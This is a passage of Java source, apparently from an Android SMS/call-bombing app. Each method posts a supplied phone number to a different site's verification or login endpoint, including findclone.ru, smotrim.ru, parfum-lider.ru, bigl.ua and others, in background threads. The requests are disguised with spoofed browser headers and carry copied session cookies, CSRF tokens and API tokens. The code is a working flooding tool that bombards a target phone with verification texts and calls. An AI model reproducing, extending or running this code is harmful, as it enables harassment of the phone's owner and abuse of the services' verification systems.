__insp_slim=1691163240364; __insp_nv=true; __insp_targlpu=aHR0cHM6Ly9hbGxvLnVhL3J1Lw%3D%3D; __insp_targlpt=0JDQm9Cb0J4gLSDQvdCw0YbQuNC_0L3QsNC70YzQvdGL0Lkg0LzQsNGA0LrQtdGC0L%2FQu9C10LnRgQ%3D%3D; private_content_version=b58dbbf82293c981f231609462a1b003; t_s_c_f_l=0%3A2%3A19dd5740b3892580%3ANlYktyC2poiqOI7sGGWCeA%3D%3D; store=default; protocol=https; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%7D; __insp_norec_sess=true; _ga_9BQQ97VH3P=GS1.1.1691163238.2.0.1691163244.54.0.0; __cf_bm=2kXTwRZ8XOLdpZhNfUOPpTPSvuYxjgFsGRDDP.5SBxI-1691163256-0-AbMSAx8CZ3qABlKdtCNpsZUopYQTgU6hgojdww4vcrurK0rxXNGuEvnXRqFomxQjSmpbyA8nUNRK8VU/kHTAK4A=")
                .header("origin", "https://allo.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://allo.ua/ru/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("stacktrace", "You can check it in Chrome or Safari")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .header("x-use-nuxt", "1")
                .build();

        new Thread(new Runnable() {

            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }


    public void findclone(String num) {
        OkHttpClient client = new OkHttpClient();

        Request request = new Request.Builder()
                .url("https://findclone.ru/register?phone=+" + num)
                .header("Accept", "application/json, text/plain, */*")
                .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("Connection", "keep-alive")
                .header("Cookie", "_ym_uid=1669735997288087654; _ym_d=1691165686; _ym_isad=2; _ym_visorc=w")
                .header("Referer", "https://findclone.ru/")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "same-origin")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("X-Requested-With", "XMLHttpRequest")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Opera\";v=\"100\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .build();

        new Thread(new Runnable() {

            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void lini(String num) {
        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("state", "1")
                .add("phone", num)
                .build();

        Request request = new Request.Builder()
                .url("https://liniilubvi.ru/personal/profile/")
                .post(formBody)
                .header("authority", "liniilubvi.ru")
                .header("accept", "*/*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "__ddg1_=MAoyejiHs9NkaFXi5Q3j; experimentVariantId_ll8=11; PHPSESSID=ri3qb0qn4rpiach8ar412b9mia; subscribe-popup=cookiesubscribe; mindboxDeviceUUID=5417e150-fa6a-40fb-9499-1f5d3213d094; directCrm-session=%7B%22deviceGuid%22%3A%225417e150-fa6a-40fb-9499-1f5d3213d094%22%7D; _ym_uid=1691166073693039463; _ym_d=1691166073; _ga=GA1.2.883067589.1691166073; _gid=GA1.2.1486020997.1691166073; _ga_cid=883067589.1691166073; _gat=1; rrpvid=74309031316681; _ym_isad=1; rcuid=638619c9a864283ffe9a538c; tmr_lvid=96232a8c80f7abfe8e258e7b86bdb808; tmr_lvidTS=1691166094398")
                .header("origin", "https://liniilubvi.ru")
                .header("referer", "https://liniilubvi.ru/personal/profile/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Opera\";v=\"100\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .build();
        new Thread(new Runnable() {

            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void ouauth(String num) {
        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"phone\":\"+" + num + "\",\"token\":\"dD0xNjkxMTY2NTgzO2k9NzcuMTExLjI0NS4xNDtEPTkwMDQ0NjUwMEE5RTg4MUEzQjY5NDkwMkJCM0VEQjhDRUQ4ODM5RUJGQzQ4QkI5ODNFRUM5NzEzMURCNDdGOTAwRTE4RjVDNTUwQTM0MUQzMzBDQkE5RTg4MzJDMURFOUJGMDYwMzk0REFFMzY0OUE1NDRBOEE1MTJCMzY5RDEwQzM1MzVDRkJCNTk4N0MxMUVCMDAzQ0ZENTI5QjVDRUZBQjlFQjRDRUNBO3U9MTY5MTE2NjU4MzUwMTg1NDQ3MTtoPTdhOTk1ZjczNDMzOWE4YjgwZGY5ZmMxOGIwNTY5MjVj\"}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");

        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("https://oauth.av.ru/check-phone")
                .post(requestBody1)
                .header("authority", "oauth.av.ru")
                .header("accept", "*/*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("content-type", "application/json")
                .header("cookie", "XSRF-TOKEN=eyJpdiI6IjBuVXhUZjA2eXB0dlBZRGY3OGhUeUE9PSIsInZhbHVlIjoiNlJwdSs1bFZ5L3lLM0l6N0czUlVGNHVZbFUyaG45M3lwYjhKVVZhMEJDQlR3NTQ5aEZEdEZ4L0xVSi9kWHY2TGJwVjBJVHlqZWZSelp6VnNGbEVwdkxqNnpiTVpQOTNrOUtXVWtYNW8vQWRHQ3YxY28va2psVmZPaE9MZFBIYW4iLCJtYWMiOiI4ZWY3ZGIyNjA0MjIxODgxODA1MDZmOTZiZTlmOWE1YTE1OThjMWM2NzM2MTM2ZmQ3NDNhOTgxMDVmOWZmMjM4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlV4REVrU3NmWkZPajBzdlN0Yk5ZNWc9PSIsInZhbHVlIjoiVkViZS9XeDVad0tqejdTL2c1VVRCcUF3NTF6MllyYVA3TDI1K0ExOGJWMmNBeUtrRVlzTnFudTRKbkMzSHRTOTE2QnAxWUVpUlprdndWbE5xdW9QMDVBcVYzcUpnNUhWcEFNRmt2d204ZnFVYURDK3NQMGprYzFQOVhza3E2WnYiLCJtYWMiOiJlNzkwYmFlYmUwYzc4YmQ3NDI2NTA1MGM4OTg5MWRlMzMyZDM0MTYwMjI5YTAwNjMyMjhkZDJhYTAyZmNmNWYzIiwidGFnIjoiIn0%3D; session-cookie=17783af701bf84b00ef56f4d1e808458a57bf20c740319b9bbd347438f8ffd95c06c0dc83d646fc836aa0caafa6a0fda; font=phone; session_timer_104056=1; session_timer_3225727=1; session_timer_3225756=1; tmr_lvid=46d40ac1cfb4000c978848080e3079a6; tmr_lvidTS=1691166505926; _gid=GA1.2.1796086578.1691166507; _ym_uid=1691166508869976249; _ym_d=1691166508; _ym_visorc=w; cted=modId%3Dlgdf6xru%3Bclient_id%3D123502634.1691166507%3Bya_client_id%3D1691166508869976249; _ym_isad=1; _sp_ses.dbf3=*; _sp_id.dbf3=87579f25-3ad0-48f9-8341-8b82eb80cf22.1691166512.1.1691166512..d557a026-58d9-4a08-af43-fa1279a3369e..3a1086c5-af7a-4006-9afa-209723c57db8.1691166512134.1; _ct_ids=lgdf6xru%3A54009%3A167513415; _ct_session_id=167513415; _ct_site_id=54009; call_s=%3C!%3E%7B%22lgdf6xru%22%3A%5B1691168313%2C167513415%2C%7B%22316849%22%3A%22916009%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E; _ct=2200000000108008406; tmr_detect=0%7C1691166512818; _ct_client_global_id=16a55a26-0bb0-5dfe-8b99-dfd09d513138; _ga=GA1.1.123502634.1691166507; _ga_D2FVM87H39=GS1.1.1691166515.1.0.1691166515.0.0.0")
                .header("origin", "https://oauth.av.ru")
                .header("referer", "https://oauth.av.ru/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Opera\";v=\"100\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("x-ajax-token", "8dfc98d9271048002f10926f6d09991219cd1b05b2d13fd768309b7816c66ebf")
                .header("x-csrf-token", "qDIIo8Wawrh3p1HGmNT7k9H3d5aDkF5ODPN1FWKT")
                .header("x-requested-with", "XMLHttpRequest")
                .header("x-xsrf-token", "eyJpdiI6IjBuVXhUZjA2eXB0dlBZRGY3OGhUeUE9PSIsInZhbHVlIjoiNlJwdSs1bFZ5L3lLM0l6N0czUlVGNHVZbFUyaG45M3lwYjhKVVZhMEJDQlR3NTQ5aEZEdEZ4L0xVSi9kWHY2TGJwVjBJVHlqZWZSelp6VnNGbEVwdkxqNnpiTVpQOTNrOUtXVWtYNW8vQWRHQ3YxY28va2psVmZPaE9MZFBIYW4iLCJtYWMiOiI4ZWY3ZGIyNjA0MjIxODgxODA1MDZmOTZiZTlmOWE1YTE1OThjMWM2NzM2MTM2ZmQ3NDNhOTgxMDVmOWZmMjM4IiwidGFnIjoiIn0=")
                .build();
        new Thread(new Runnable() {

            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void smotrim(String num) {
        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("phone", num)
                .add("_token", "OfPt3A5wO4fD9Hx4fDD1M64lJt76c1nAJthmQpT8")
                .build();

        Request request = new Request.Builder()
                .url("https://smotrim.ru/personal/login?redirect=%2Fpersonal%2Fpayment-choice%3Fplan%3Dsmotrim_annual%26redirect%3D%252Ftariffs")
                .post(formBody)
                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
                .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("Cache-Control", "max-age=0")
                .header("Connection", "keep-alive")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Cookie", "ngx_uid=wKgcMWTODT62/+mSHDEsAg==; intickets_enter_referrer=; intickets_enter_url=https%3A%2F%2Fsmotrim.ru%2F; tmr_lvid=39c3c08fc3338d0a3130bf1608dfffab; tmr_lvidTS=1691225415154; _ym_uid=1691225418870870491; _ym_d=1691225418; _ym_visorc=b; _ym_isad=1; usid=2gRw_tFUwa")
                .header("Origin", "https://smotrim.ru")
                .header("Referer", "https://smotrim.ru/personal/login?redirect=%2Fpersonal%2Fpayment-choice%3Fplan%3Dsmotrim_annual%26redirect%3D%252Ftariffs")
                .header("Sec-Fetch-Dest", "document")
                .header("Sec-Fetch-Mode", "navigate")
                .header("Sec-Fetch-Site", "same-origin")
                .header("Sec-Fetch-User", "?1")
                .header("Upgrade-Insecure-Requests", "1")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Opera\";v=\"100\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .build();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    System.out.println(response.body().string());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void parfum(String num) {
        OkHttpClient client = new OkHttpClient();

        String requestBody = "token=4140c57c5b35289ecf90f34a51e620cc452d1b9c7947b11962c4a7eac9e8fd78&phone=%2B7+(976)+868-73-45";

        RequestBody requestBody1 = new FormBody.Builder()
                .add("token", "4140c57c5b35289ecf90f34a51e620cc452d1b9c7947b11962c4a7eac9e8fd78")
                .add("phone", "+" + num)
                .build();

        Request request = new Request.Builder()
                .url("https://www.parfum-lider.ru/local/ajax/auth/by_call.php")
                .post(requestBody1)
                .header("authority", "www.parfum-lider.ru")
                .header("accept", "application/json, text/javascript, */*; q=0.01")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "PHPSESSID=8rcnODyWksesurd0eoplq4bbedCz152Z; parfumlider_GUEST_ID=51276850; parfumlider_SALE_UID=dae833ee68db619b2935a311727488db; parfumlider_ALTASIB_LAST_IP=77.111.245.14; parfumlider_ALTASIB_GEOBASE=%7B%22COUNTRY_CODE%22%3A%22EU%22%2C%22COUNTRY_CODE3%22%3A%22EU%22%2C%22COUNTRY_NAME%22%3A%22Europe%22%2C%22REGION_CODE%22%3A%22%22%2C%22REGION_NAME%22%3A%22%22%2C%22CITY_NAME%22%3A%22%22%2C%22POSTINDEX%22%3A%22%22%2C%22CONTINENT_CODE%22%3A%22EU%22%2C%22latitude%22%3A%2247%22%2C%22longitude%22%3A%228%22%7D; parfumlider_ALTASIB_GEOBASE_CODE=%7B%22REGION%22%3A%7B%22CODE%22%3A%2277%22%2C%22NAME%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22FULL_NAME%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%93%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22SOCR%22%3A%22%D0%B3%22%7D%2C%22DISTRICT%22%3A%7B%22CODE%22%3A%22%22%2C%22NAME%22%3A%22%22%2C%22SOCR%22%3A%22%22%7D%2C%22CITY%22%3A%7B%22ID%22%3A%22%22%2C%22NAME%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22SOCR%22%3A%22%D0%B3%22%2C%22POSTINDEX%22%3A%220%22%2C%22ID_DISTRICT%22%3A%2277000%22%7D%2C%22CODE%22%3A%2277000000000%22%7D; parfumlider_ALTASIB_GEOBASE_COUNTRY=%7B%22country%22%3A%22RU%22%7D; parfumlider_currentStoreCity=77000000000; parfumlider_kernel=-crpt-kernel_0; _ym_uid=1691225788476317546; _ym_d=1691225788; uxs_uid=f8765320-336d-11ee-b6c0-a7402259b815; _gid=GA1.2.1608270627.1691225791; _gat=1; _gat_gtag_UA_8407288_3=1; mindboxDeviceUUID=5417e150-fa6a-40fb-9499-1f5d3213d094; directCrm-session=%7B%22deviceGuid%22%3A%225417e150-fa6a-40fb-9499-1f5d3213d094%22%7D; _gcl_au=1.1.1308122634.1691225794; _dc_gtm_UA-184775945-1=1; _userGUID=0:lkxs6ape:T~tJ5qR5a2PQPOtF2pXsIoRlwuCNSu32; dSesn=f419e611-28c8-5257-98aa-5aafe7ce7dcb; _dvs=0:lkxs6ape:QN~dSTEOK6mzKaLSgE_GkQhFmK9lrT~u; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _dc_gtm_UA-8407288-3=1; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A8%2C%22EXPIRE%22%3A1691258340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_F7E8S2FPPY=GS1.1.1691225796.1.1.1691225828.28.0.0; _ga=GA1.1.643869338.1691225791; _ga_WJHFTTTY6X=GS1.2.1691225798.1.1.1691225830.0.0.0; tinkoff_auth_state=k8YqjO0ZnT1vyoseI2f7; parfumlider_LAST_VISIT=05.08.2023%2014%3A57%3A13; parfumlider_kernel_0=vzRdgCZUg3x01u8Y_Tw0oMlgqnPsaByvKO341oZGOa-fYcTq4Si5e5WPaMJjTHtm1ZzlmvFuQaYJSmTrsLqdoQvLqk46ZdmaKt0g0KztDZLZmgEBP8EqLJBmfLUK5DEcWIhssGPc055CZz4vuag9PGL4G-8bbFkjTJFPT5UZb8_zDD7L1aeP7m6uvvIDuI2GscWQ8N-mEaE1lhXl4vKDM5eHvaoHCezUWfNY74hvCdXO_nP6JoTMehPQQ-mb4jhw4-7dXnhdKse4CbngSoMG2QZ2jhubl2HZRtfAoDQA8k3Rc2JvGC2j_eUYgwqzMMRgkMMbrtW84G7vGIaGe-NRbxr9oX1LPYp-jdUvm05wm-Xqun3ZPe1RCnrnduIQVKIVYa48JPViSIvM6H_XX--iYflulY1CEYVqeJDsxPPJ6DoRZMcRJ4pt9eR8VadhRN3vzlLNLbjvxzvsGVbjzeIJ6VeSoakSqGleY04Vl6Zvp_Fea5rIoKZPSTip-jodjHD-e3o74SCiRHf1SQL5If1hc3j-HwB7YHgRyO52FfzOEgakLYN0yBqWUzaexT7XxLeAerVQp1OdKGVhQ-h2ZaSaHFCN3cr4yerGKYgiT1AcXFZ5K3cQ6vWpOS6g_EtZNhS5WBS29qQ4ckkyq0lW9NXPEfQVie_cdNVghfnfDkV85sDdk0VN7CI8Ez-q9cjw0IXtMRuxkGojBfTO8jWvrhPF_SZDyX-Y70Cf-AqxQ3kwfUnBCsx3omYaZ_9mHEUK7NSN6xC_o_ItoUXOA78GTq5kahrzabUhysVtBfWFbGcZcB3E5uz-amH_puaggFlU2XpOqI7RTg; _ym_isad=2; BX_USER_ID=58df564d326af33964e0415afeff2c5b")
                .header("origin", "https://www.parfum-lider.ru")
                .header("referer", "https://www.parfum-lider.ru/favorite/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Opera\";v=\"100\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .build();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    System.out.println(response.body().string());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void info(String num) {
        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"phone\":\"" + num.substring(1) + "\"}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("https://info-api.er.ru/api/auth/authenticate")
                .post(requestBody1)
                .header("authority", "info-api.er.ru")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("content-type", "application/json")
                .header("origin", "https://info.er.ru")
                .header("referer", "https://info.er.ru/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Opera\";v=\"100\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-site")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .build();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    System.out.println(response.body().string());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void sushihistory(String num) {
        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"phone\":\"+" + num + "\",\"numbers\":4}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("http://ua.sushistory.com/user/phone/validate")
                .post(requestBody1)
                .header("Accept", "application/json, text/plain, */*")
                .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("Cache-Control", "no-cache")
                .header("Connection", "keep-alive")
                .header("Content-Type", "application/json")
                .header("Cookie", "_csrf=oPO68hi81LxjTRABVA8Vxq1Y; connect.sid=s%3AT2SxlrIF9j6yHBLqFPa7vMNRN59UO5Hj.2kdRa81TSpD03SLIJ8HjNVi1PgpTtCxOmPTtzVwe7Dg; _sticky_param=d; _ga_1ZW83861XL=GS1.1.1696068626.1.0.1696068626.60.0.0; _gcl_au=1.1.1677859266.1696068627; _ga_TE53H5X77H=GS1.1.1696068627.1.0.1696068627.60.0.0; _ga=GA1.2.307399910.1696068627; _gid=GA1.2.999592331.1696068628; _fbp=fb.1.1696068627565.973004383; biatv-cookie={%22firstVisitAt%22:1696068627%2C%22visitsCount%22:1%2C%22currentVisitStartedAt%22:1696068627%2C%22currentVisitLandingPage%22:%22http://ua.sushistory.com/kiev/menu/sety/%22%2C%22currentVisitUpdatedAt%22:1696068627%2C%22currentVisitOpenPages%22:1%2C%22campaignTime%22:1696068627%2C%22campaignCount%22:1%2C%22utmDataCurrent%22:{%22utm_source%22:%22google%22%2C%22utm_medium%22:%22organic%22%2C%22utm_campaign%22:%22(not%20set)%22%2C%22utm_content%22:%22(not%20set)%22%2C%22utm_term%22:%22(not%20provided)%22%2C%22beginning_at%22:1696068627}%2C%22utmDataFirst%22:{%22utm_source%22:%22google%22%2C%22utm_medium%22:%22organic%22%2C%22utm_campaign%22:%22(not%20set)%22%2C%22utm_content%22:%22(not%20set)%22%2C%22utm_term%22:%22(not%20provided)%22%2C%22beginning_at%22:1696068627}}; _gat_gtag_UA_88670217_1=1; _gat_gtag_UA_230108653_5=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1; _tt_enable_cookie=1; _ttp=jbLe7mL-OeiELWKN04EggwGZAm3; _ga_YH28KCLF7M=GS1.2.1696068628.1.0.1696068628.0.0.0; _ga_19SMME3NES=GS1.2.1696068628.1.0.1696068628.60.0.0")
                .header("Origin", "http://ua.sushistory.com")
                .header("Pragma", "no-cache")
                .header("Referer", "http://ua.sushistory.com/kiev/menu/sety/")
                .header("User-Agent", "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SM-N900T Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
                .header("X-Requested-With", "XMLHttpRequest")
                .header("x-csrf-token", "Jk39Owig-LT1QOk5vg16m-17qELYOMK2Iq-E")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void izak(String num) {
        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"phone\":\"" + num + "\",\"token\":\"06aad3355f748edb7c2469aee34783a54425\"}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("https://e-api.com.ua/api/v1/call2fa/yizhak-web/call-pool/create")
                .post(requestBody1)
                .header("Accept", "application/json, text/plain, */*")
                .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("Cache-Control", "no-cache")
                .header("Connection", "keep-alive")
                .header("Content-Type", "application/json")
                .header("Origin", "https://yizhak.kr.ua")
                .header("Pragma", "no-cache")
                .header("Referer", "https://yizhak.kr.ua/")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "cross-site")
                .header("User-Agent", "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SM-N900T Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
                .header("X-Custom-Header", "foobar")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void bbcn(String num) {

        OkHttpClient client = new OkHttpClient();

        Request request = new Request.Builder()
                .url("https://bb.cn.ua/api/phone-verify?phone=" + num + "&token=149815")
                .post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"),""))
                .header("authority", "bb.cn.ua")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("api-account-token", "09a4eae0-5688-11eb-b236-398a53e58c79")
                .header("api-lang", "ua")
                .header("cache-control", "no-cache")
                .header("content-length", "0")
                .header("cookie", "NEXT_LOCALE=ua; _gid=GA1.3.2038936588.1696069750; _gac_UA-195417622-1=1.1696069750.Cj0KCQjwjt-oBhDKARIsABVRB0yZtNBqbvywWbuzRETnY_1_JqgMxU8BEP1iIMrA2mDbNqexiebB1Q8aAs1TEALw_wcB; _gat_UA-195417622-1=1; _ga=GA1.1.1378718876.1696069750; _fbp=fb.2.1696069750966.1540168483; csrfSecret=qd3W7z_9QCCzj-3x_Hq9MsQO; XSRF-TOKEN=lj5Eezrq-EiUy71mhh8slyawfIS1JcM_LKzM.u9uBu%2BECD4%2BKp7TeTcaooeVO7tOgOd1zNhLJ3m7pCC4; _ga_EBPHW5RMBJ=GS1.1.1696069750.1.1.1696069777.33.0.0")
                .header("origin", "https://bb.cn.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://bb.cn.ua/auth/login")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SM-N900T Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
                .header("x-xsrf-token", "lj5Eezrq-EiUy71mhh8slyawfIS1JcM_LKzM.u9uBu+ECD4+Kp7TeTcaooeVO7tOgOd1zNhLJ3m7pCC4")
                .build();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
    public void big(String num) {

        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"phone\":\"+" + num + "\"}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("https://my.bigl.ua/api/auth/phone_email_step")
                .post(requestBody1)
                .header("authority", "my.bigl.ua")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("cache-control", "no-cache")
                .header("content-type", "application/json; charset=UTF-8")
